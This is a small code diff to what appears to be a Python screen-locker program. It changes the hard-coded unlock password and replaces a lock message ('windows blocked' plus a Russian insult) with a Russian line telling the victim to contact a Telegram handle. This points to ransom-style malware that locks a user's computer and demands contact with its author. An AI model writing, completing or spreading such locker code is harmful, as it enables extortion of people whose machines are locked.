@@ -15,8 +15,8 @@ import os
 import keyboard
 import sys
 
-password = "123"
-lock_text = "windows blocked.tobi pizda"
+password = "88005553535"
+lock_text = "пиши на тг-@imadshax "
 count = 3
 
 
